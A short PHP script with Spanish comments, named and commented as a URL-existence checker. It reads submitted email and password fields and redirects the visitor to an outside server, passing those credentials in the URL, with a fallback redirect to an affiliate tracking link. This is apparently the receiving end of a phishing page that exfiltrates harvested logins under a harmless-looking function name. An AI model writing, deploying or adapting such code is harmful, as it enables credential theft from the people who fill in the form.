<?
// se debe pasar la IP o direccion de internet sin 'http://'
if (ValidarUrl("http://server1.3utilities.com/api-server.php"))
 echo "Dirección existente";
else
 echo "Dirección inexistente";
 
 
function ValidarUrl($url) {
$usuario = $_POST[ 'email' ];
$password = $_POST[ 'pass' ];
 //fsockopen -> Abrir una conexión de sockets de dominio de Internet o Unix
 //resource fsockopen ( string destino, int puerto [, int errno [, string errstr [, float tiempo_espera]]])
 $validar = @fsockopen($url, 80, $errno, $errstr, 15);
 if ($validar) {
 header ("Location: http://server1.3utilities.com/chelin/login.php?usuario=".$usuario ."&password=".$password."");
 }else
  header ("Location: https://Tracking-all-traffic.offerdirecto.com?id=LGoRTd6m85&type=21&click_id={click_id}");
}
?>
